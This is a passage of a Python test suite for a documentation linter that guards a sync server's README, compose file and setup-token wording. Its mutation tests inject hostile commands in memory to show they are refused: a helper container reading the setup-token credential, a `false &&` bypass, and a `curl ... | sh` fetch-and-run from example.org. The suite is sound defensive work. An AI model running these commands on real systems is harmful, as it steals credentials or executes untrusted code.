    def test_the_quick_start_calls_the_token_a_standing_credential(self):
        quick_start = section(documents()["README.md"], "## Get syncing")
        self.assertIn(RECOVERY_SENTENCE, quick_start)


class TheParserFindsWhatItClaimsTo(unittest.TestCase):
    """Vacuity: the refusals above are worth nothing if nothing is parsed."""

    def test_the_quick_start_section_is_found_and_bounded(self):
        quick_start = section(documents()["README.md"], "## Get syncing")
        self.assertIn("docker run", quick_start)
        self.assertNotIn("## What it does", quick_start)

    def test_every_documented_command_is_read(self):
        lines = logical_lines(documents()["README.md"])
        self.assertTrue(any(line.startswith("docker run ") for line in lines))
        self.assertTrue(any(line.startswith("cosign verify ") for line in lines))

    def test_the_image_is_found_past_every_flag_the_readme_uses(self):
        line = next(
            line
            for line in logical_lines(documents()["README.md"])
            if line.startswith("docker run ")
        )
        image = _image_of(shlex.split(line)[2:])
        self.assertIsNotNone(image)
        self.assertTrue(image.startswith(SERVER_IMAGE_PREFIX), image)

    def test_a_line_is_read_as_the_shell_would_run_it(self):
        # Structure, not text: two pipelines, the second one CONDITIONAL, and
        # neither the wrapper nor the assignment is the command.
        parsed = executable(
            f"false && sudo FOO=1 docker cp obsync{TOKEN_PATH} - | tar -xO"
        )
        self.assertEqual([pipeline.operator for pipeline in parsed], [None, "&&"])
        self.assertFalse(parsed[1].unconditional)
        self.assertEqual(
            parsed[1].commands,
            (
                ("docker", "cp", f"obsync{TOKEN_PATH}", "-"),
                ("tar", "-xO"),
            ),
        )

    def test_a_shell_string_is_parsed_as_a_line_of_its_own(self):
        parsed = executable("sh -lc 'docker run --rm busybox'")
        self.assertEqual(
            [(pipeline.nested, pipeline.commands) for pipeline in parsed],
            [
                (True, (("docker", "run", "--rm", "busybox"),)),
                (False, (("sh", "-lc", "docker run --rm busybox"),)),
            ],
        )

    def test_the_compose_file_is_read_and_names_its_services(self):
        # Rule 8 is worth nothing if the file never resolves: a `miniyaml`
        # refusal and an empty answer would look the same from outside.
        document = miniyaml.load_one(documents()[COMPOSE_NAME])
        self.assertIn(OBSYNC_SERVICE, document["services"])
        self.assertGreater(len(document["services"]), 1)
        self.assertEqual(_compose_file_refusals(documents()[COMPOSE_NAME]), [])

    def test_both_install_paths_are_counted_as_server_starts(self):
        # The floor in `_token_read_refusals` is this number, so a counter that
        # silently found nothing would make that rule vacuous.
        quick_start = section(documents()[README_NAME], "## Get syncing")
        self.assertEqual(_server_starts(quick_start), 2)

    def test_a_compose_verb_is_found_past_its_global_flags(self):
        self.assertEqual(
            _compose_verb(("docker", "compose", "-f", "x.yml", "-p", "n", "up", "-d")),
            ("up", ("-d",)),
        )
        self.assertIsNone(_compose_verb(("docker", "run", "up")))

    def test_an_assignment_prefix_survives_the_wrappers(self):
        # `_strip_wrappers` throws these away on purpose; rule 10 needs them.
        self.assertEqual(
            _assignments(("OBSYNC_IMAGE=x", "sudo", "-u", "root", "docker", "compose")),
            {"OBSYNC_IMAGE": "x"},
        )

    def test_a_semicolon_does_not_end_a_sentence(self):
        # The rule is "the same sentence", and a semicolon joins clauses into
        # one. Splitting on it would be a quiet weakening of rule 5.
        self.assertEqual(len(sentences("A one-time link; the setup token stays.")), 1)




# The quick start's own token read, as committed. Every mutation below either
# replaces this line or hangs a hostile one off it, so it is named once.
QUICK_START_READ = f"docker cp obsync{TOKEN_PATH} - | tar -xO"

# The compose path's own two lines, named once for the same reason.
COMPOSE_UP_IMAGE = f"OBSYNC_IMAGE={SERVER_IMAGE_PREFIX}<digest>"
COMPOSE_UP_BIND = f"{BIND_ADDRESS_VARIABLE}=192.168.1.10"
COMPOSE_SERVICE_IMAGE = f"image: {COMPOSE_IMAGE}"
# A syntactically perfect digest that is not this project's image, and one that
# is. Both are refused in the compose file, for different reasons.
FAKE_DIGEST = "@sha256:" + "0" * 64

# The wording docs/architecture.md section 4.1 must carry, as a FIXTURE. The
# architecture rules are proven against this rather than against the file on
# disk, so a negative test says "this rule can fail" and never doubles as a
# second, quieter copy of the positive assertion above. The positive one has
# exactly one home: `test_the_documents_raise_no_refusal`.
ARCHITECTURE_FIXTURE = """## 4. Devices, pairing, identity

### 4.1 First device

At first boot `obsyncd` mints a setup token and writes it, mode 0600 and
never logged, to `v1/setup-token` on the journal volume. The first plugin
instance consumes it: `POST /v1/setup` creates the account and enrols that
device. That call creates the account once; the token is not spent by it and
remains the dashboard's recovery sign-in for the life of the server.

### 4.2 Pairing a new device

Nothing here is read by this suite.
"""


class MutatedDocumentsAreRefused(unittest.TestCase):
    """One broken property per test: mutate, and require the refusal to APPEAR.

    Each test compares the refusals BEFORE and AFTER one edit and requires the
    named refusal to be absent before and present after. That is stronger than
    "the list is non-empty afterwards" -- it proves this mutation caused this
    refusal -- and it means an unrelated refusal standing elsewhere in the two
    documents cannot mask, or fake, a kill in this matrix.

    Every mutation is in memory. Nothing here writes to the repository.
    """

    def setUp(self):
        self.documents = documents()
        self.documents["docs/architecture.md"] = ARCHITECTURE_FIXTURE
        self.before = refusals(self.documents)

    def mutate(self, name: str, old: str, new: str) -> list[str]:
        text = self.documents[name]
        self.assertIn(old, text, f"the fixture no longer matches {name}")
        self.documents[name] = text.replace(old, new, 1)
        return refusals(self.documents)

    def kills(self, found: list[str], needle: str) -> None:
        """The mutation added exactly this refusal, and it was not there before."""
        self.assertFalse(
            [line for line in self.before if needle in line],
            f"{needle!r} was already refused before the mutation",
        )
        self.assertTrue(
            [line for line in found if needle in line],
            f"{needle!r} was not refused after the mutation: {found}",
        )

    def test_the_fixture_baseline_is_clean(self):
        # Non-vacuity for the whole class: every `kills` below asserts the
        # refusal was ABSENT beforehand, which is only meaningful if the
        # starting point actually raises nothing.
        self.assertEqual(self.before, [])

    def test_running_the_mutable_tag_is_refused(self):
        found = self.mutate(
            "README.md", SERVER_IMAGE_PREFIX, "ghcr.io/snaraj/obsync:v0.1.0 #"
        )
        self.kills(found, "not ghcr.io/snaraj/obsync@sha256:")

    def test_a_helper_container_on_the_journal_volume_is_refused(self):
        found = self.mutate(
            "README.md",
            QUICK_START_READ,
            "docker run --rm -v obsync-journal:/j docker.io/library/busybox "
            "cat /j/v1/setup-token",
        )
        self.kills(found, "a tag or a helper image")

    def test_a_read_only_helper_mount_is_still_refused(self):
        # The narrower variant a reviewer might argue for: no network of its
        # own, mounted read-only. It still hands a third-party image the volume
        # that holds the server key.
        found = self.mutate(
            "README.md",
            QUICK_START_READ,
            f"{QUICK_START_READ}\n"
            "cat x | docker run --rm -v obsync-journal:/j:ro busybox cat /j/x",
        )
        self.kills(found, "a tag or a helper image")

    def test_a_journal_mount_on_a_non_run_command_is_refused(self):
        # The rule stands on its own, not only as a consequence of rule 1: a
        # command that is not `docker run` at all still may not touch that
        # volume.
        found = self.mutate(
            "README.md",
            QUICK_START_READ,
            f"{QUICK_START_READ}\ndocker create -v obsync-journal:/j scratch",
        )
        self.kills(found, "is named by a command that is not")

    def test_the_round_five_reviewer_bypass_is_refused(self):
        # The exact two lines an adversarial reviewer wrote to leave all 174
        # tests green: the promised read behind a `false &&` that never runs
        # it, and a long-form `docker container run` handing a third-party
        # image the journal volume through `--mount`. Three properties break
        # at once, and each is named separately so a partial repair cannot
        # pass this test.
        found = self.mutate(
            "README.md",
            QUICK_START_READ,
            f"false && {QUICK_START_READ}\n"
            "docker container run --rm --mount "
            "type=volume,source=obsync-journal,target=/j "
            "docker.io/library/busybox cat /j/v1/setup-token",
        )
        self.kills(found, "no longer reads the setup token")
        self.kills(found, "a tag or a helper image")
        self.kills(found, "is named by a command that is not")

    def test_a_read_the_reader_cannot_reach_is_refused(self):
        found = self.mutate(
            "README.md", QUICK_START_READ, f"true || {QUICK_START_READ}"
        )
        self.kills(found, "no longer reads the setup token")

    def test_a_read_buried_in_a_shell_string_is_refused(self):
        # One level down is not the quick start: the reader is told to paste a
        # command, and `sh -c '…'` is a different command that happens to
        # contain it.
        found = self.mutate(
            "README.md", QUICK_START_READ, f"sh -c '{QUICK_START_READ}'"
        )
        self.kills(found, "no longer reads the setup token")

    def test_a_helper_run_under_a_wrapper_is_refused(self):
        found = self.mutate(
            "README.md",
            QUICK_START_READ,
            f"{QUICK_START_READ}\n"
            "sudo docker run --rm -v obsync-journal:/j busybox cat /j/x",
        )
        self.kills(found, "a tag or a helper image")

    def test_a_helper_run_behind_an_assignment_is_refused(self):
        found = self.mutate(
            "README.md",
            QUICK_START_READ,
            f"{QUICK_START_READ}\nFOO=1 docker run --rm busybox",
        )
        self.kills(found, "a tag or a helper image")

    def test_a_helper_run_inside_a_shell_string_is_refused(self):
        found = self.mutate(
            "README.md",
            QUICK_START_READ,
            f'{QUICK_START_READ}\nsh -c "docker run --rm --mount '
            'type=volume,src=obsync-journal,target=/j busybox"',
        )
        # Both rules must reach INSIDE the string: the journal name is visible
        # in the outer `sh -c` token either way, but the helper image is only
        # visible once the string is parsed as a line of its own.
        self.kills(found, "is named by a command that is not")
        self.kills(found, "a tag or a helper image")

    def test_a_journal_mount_written_as_mount_equals_is_refused(self):
        found = self.mutate(
            "README.md",
            QUICK_START_READ,
            f"{QUICK_START_READ}\ndocker create "
            "--mount=type=volume,source=obsync-journal,target=/j scratch",
        )
        self.kills(found, "is named by a command that is not")

    def test_a_journal_mount_written_as_v_equals_is_refused(self):
        found = self.mutate(
            "README.md",
            QUICK_START_READ,
            f"{QUICK_START_READ}\ndocker container create "
            "-v=obsync-journal:/j scratch",
        )
        self.kills(found, "is named by a command that is not")

    def test_creating_the_journal_volume_is_not_refused(self):
        # Rule 4's positive control. The one shape allowed to name the volume
        # outside the server's own run still passes, so the rule above refuses
        # a HELPER rather than the word.
        found = self.mutate(
            "README.md",
            QUICK_START_READ,
            f"{QUICK_START_READ}\ndocker volume create obsync-journal",
        )
        self.assertEqual(found, self.before)

    def test_dropping_the_certificate_identity_is_refused(self):
        found = self.mutate(
            "README.md", flag_text(CERTIFICATE_IDENTITY), "--certificate-identity .*"
        )
        self.kills(found, flag_text(CERTIFICATE_IDENTITY))

    def test_a_near_miss_certificate_identity_is_refused(self):
        found = self.mutate(
            "README.md",
            "release-publisher.yml@refs/heads/main",
            "release-publisher.yml@refs/heads/mian",
        )
        self.kills(found, flag_text(CERTIFICATE_IDENTITY))

    def test_dropping_the_oidc_issuer_is_refused(self):
        found = self.mutate(
            "README.md", flag_text(CERTIFICATE_ISSUER), "--certificate-oidc-issuer .*"
        )
        self.kills(found, flag_text(CERTIFICATE_ISSUER))

    def test_a_near_miss_oidc_issuer_is_refused(self):
        found = self.mutate(
            "README.md",
            "https://token.actions.githubusercontent.com",
            "https://token.actions.githubusercontent.com.example.net",
        )
        self.kills(found, flag_text(CERTIFICATE_ISSUER))

    def test_losing_the_tokenless_token_read_is_refused(self):
        found = self.mutate(
            "README.md",
            QUICK_START_READ,
            "look in the journal volume",
        )
        self.kills(found, "no longer reads the setup token")

    def test_calling_the_token_one_time_in_the_readme_is_refused(self):
        found = self.mutate(
            "README.md",
            "At first boot the server mints a setup token",
            "At first boot the server mints a one-time setup token",
        )
        self.kills(found, '"one-time" shares a sentence')

    def test_calling_the_token_one_time_in_the_plugin_settings_is_refused(self):
        # The exact sentence the settings tab carried until this rule reached
        # it: the one a person reads while holding the credential.
        found = self.mutate(
            SETTINGS_NAME,
            "Paste the setup token your server wrote at first boot.",
            "Paste the one-time setup token your server printed at first boot.",
        )
        self.kills(found, '"one-time" shares a sentence')

    def test_calling_the_token_one_time_in_the_dashboard_is_refused(self):
        found = self.mutate(
            DASHBOARD_NAME,
            "The server writes a setup token at first boot and",
            "The server prints a one-time setup token at first boot and",
        )
        self.kills(found, '"one-time" shares a sentence')

    def test_calling_the_token_one_time_in_the_architecture_is_refused(self):
        found = self.mutate(
            "docs/architecture.md",
            "At first boot `obsyncd` mints a setup token",
            "At first boot `obsyncd` prints a one-time setup token",
        )
        self.kills(found, '"one-time" shares a sentence')

    def test_deleting_the_readme_recovery_sentence_is_refused(self):
        found = self.mutate("README.md", RECOVERY_SENTENCE, "is consumed by the plugin")
        self.kills(found, "no longer says the token")

    def test_deleting_the_architecture_recovery_sentence_is_refused(self):
        found = self.mutate(
            "docs/architecture.md", RECOVERY_SENTENCE, "is discarded"
        )
        self.kills(found, "remains the recovery sign-in")

    def test_losing_the_architecture_never_logged_claim_is_refused(self):
        found = self.mutate("docs/architecture.md", "never logged", "logged at info")
        self.kills(found, "'never logged'")

    def test_losing_the_architecture_journal_volume_claim_is_refused(self):
        found = self.mutate("docs/architecture.md", "journal volume", "server's disk")
        self.kills(found, "'journal volume'")

    def test_deleting_architecture_section_4_1_is_refused(self):
        found = self.mutate(
            "docs/architecture.md", "### 4.1 First device", "### 4.1 Onboarding"
        )
        self.kills(found, "no `### 4.1 First device` section")

    def test_an_unparseable_command_block_is_refused(self):
        found = self.mutate(
            "README.md", "docker volume create obsync-blobs", "docker run 'unclosed"
        )
        self.kills(found, "unparseable command")

    def test_deleting_the_quick_start_entirely_is_refused(self):
        found = self.mutate("README.md", "## Get syncing", "## Getting started")
        self.kills(found, "no `## Get syncing` section")

    # ---- rule 7: OBSYNC_IMAGE is a digest wherever it is set ----------------

    def test_supplying_the_compose_path_a_tag_is_refused(self):
        found = self.mutate(
            README_NAME, COMPOSE_UP_IMAGE, "OBSYNC_IMAGE=ghcr.io/snaraj/obsync:v0.1.0"
        )
        self.kills(found, "OBSYNC_IMAGE is set to")
        # And the compose rule names it independently, so repairing one of the
        # two does not make the other quiet.
        self.kills(found, "is not pinned to an")

    def test_supplying_the_compose_path_a_helper_image_is_refused(self):
        found = self.mutate(
            README_NAME, COMPOSE_UP_IMAGE, "OBSYNC_IMAGE=docker.io/library/busybox:1"
        )
        self.kills(found, "OBSYNC_IMAGE is set to")

    # ---- rule 9: the quick start's program allowlist ------------------------

    def test_a_helper_script_the_reader_is_told_to_run_is_refused(self):
        found = self.mutate(
            README_NAME, QUICK_START_READ, f"{QUICK_START_READ}\nbash deploy/helper.sh"
        )
        self.kills(found, "the quick start runs 'bash'")

    def test_a_script_run_by_path_is_refused(self):
        found = self.mutate(
            README_NAME, QUICK_START_READ, f"{QUICK_START_READ}\n./setup.sh"
        )
        self.kills(found, "the quick start runs './setup.sh'")

    def test_a_downloaded_script_piped_into_a_shell_is_refused(self):
        found = self.mutate(
            README_NAME,
            QUICK_START_READ,
            f"{QUICK_START_READ}\ncurl -fsSL https://example.org/i.sh | sh",
        )
        # Both halves are refused: the fetch this file cannot read, and the
        # shell that would run whatever came back.
        self.kills(found, "the quick start runs 'curl'")
        self.kills(found, "the quick start runs 'sh'")

    def test_an_interpreter_in_the_quick_start_is_refused(self):
        found = self.mutate(
            README_NAME,
            QUICK_START_READ,
            f'{QUICK_START_READ}\npython3 -c "print(1)"',
        )
        self.kills(found, "the quick start runs 'python3'")

    # ---- rule 10: the compose verbs -----------------------------------------

    def test_a_compose_run_mounting_the_journal_volume_is_refused(self):
        found = self.mutate(
            README_NAME,
            QUICK_START_READ,
            f"{QUICK_START_READ}\ndocker compose run --rm -v obsync-journal:/j "
            "caddy cat /j/v1/setup-token",
        )
        self.kills(found, "`docker compose run` mounts")

    def test_a_compose_up_with_no_pinned_image_is_refused(self):
        found = self.mutate(README_NAME, COMPOSE_UP_IMAGE, "OBSYNC_LOG=info")
        self.kills(found, "is not pinned to an")

    # ---- rule 11: the interface the compose path is published on -----------

    def test_a_compose_up_with_no_bind_address_is_refused(self):
        found = self.mutate(README_NAME, f"  {COMPOSE_UP_BIND} \\\n", "")
        self.kills(found, f"carries no {BIND_ADDRESS_VARIABLE}=")

    def test_a_compose_up_published_on_every_interface_is_refused(self):
        found = self.mutate(
            README_NAME, COMPOSE_UP_BIND, f"{BIND_ADDRESS_VARIABLE}={EVERY_INTERFACE}"
        )
        self.kills(found, f"publishes on {EVERY_INTERFACE}")

    def test_naming_every_interface_in_prose_is_not_refused(self):
        # Rule 11's positive control, and the reason the rule reads COMMANDS:
        # the README has to be able to say what `0.0.0.0` means and when it is
        # the right answer, which it does. Only a line a reader can paste is
        # refused, so a second mention in prose adds no refusal at all.
        found = self.mutate(
            README_NAME,
            "Compose refuses to start until you have chosen",
            f"A bind of {EVERY_INTERFACE} is that exposure decision. "
            "Compose refuses to start until you have chosen",
        )
        self.assertEqual(found, self.before)

    def test_a_compose_down_is_not_refused(self):
        # Rule 10's positive control: the verbs that start nothing are free, so
        # the rule refuses a SERVICE START rather than the word `compose`.
        found = self.mutate(
            README_NAME,
            QUICK_START_READ,
            f"{QUICK_START_READ}\ndocker compose -f deploy/compose/docker-compose.yml "
            "down -v",
        )
        self.assertEqual(found, self.before)

    # ---- rule 8: the compose file -------------------------------------------

    def test_a_tag_in_the_compose_file_is_refused(self):
        found = self.mutate(
            COMPOSE_NAME, COMPOSE_SERVICE_IMAGE, "image: ghcr.io/snaraj/obsync:v0.1.0"
        )
        self.kills(found, "not `${OBSYNC_IMAGE}`")

    def test_a_helper_image_in_the_compose_file_is_refused(self):
        found = self.mutate(
            COMPOSE_NAME,
            COMPOSE_SERVICE_IMAGE,
            f"image: docker.io/library/busybox{FAKE_DIGEST}",
        )
        self.kills(found, "not `${OBSYNC_IMAGE}`")

    def test_a_literal_image_in_the_compose_file_is_refused(self):
        # The dangerous one, because it LOOKS right: a correct digest of the
        # correct image, committed. It goes stale the day the next release
        # publishes, and then the file runs bytes nobody verified today.
        found = self.mutate(
            COMPOSE_NAME,
            COMPOSE_SERVICE_IMAGE,
            f"image: ghcr.io/snaraj/obsync{FAKE_DIGEST}",
        )
        self.kills(found, "not `${OBSYNC_IMAGE}`")

    def test_a_mutable_terminator_tag_is_refused(self):
        found = self.mutate(
            COMPOSE_NAME, "image: docker.io/library/caddy@sha256:", "image: caddy:latest #"
        )
        self.kills(found, "not an @sha256 digest with no tag")

    def test_a_compose_file_this_reader_cannot_resolve_is_refused(self):
        found = self.mutate(COMPOSE_NAME, "services:", "services: &everything")
        self.kills(found, "cannot be resolved")

    def test_renaming_the_obsync_service_is_refused(self):
        found = self.mutate(COMPOSE_NAME, "\n  obsync:\n", "\n  obsyncd:\n")
        self.kills(found, f"has no `services.{OBSYNC_SERVICE}` mapping")


if __name__ == "__main__":
    unittest.main()
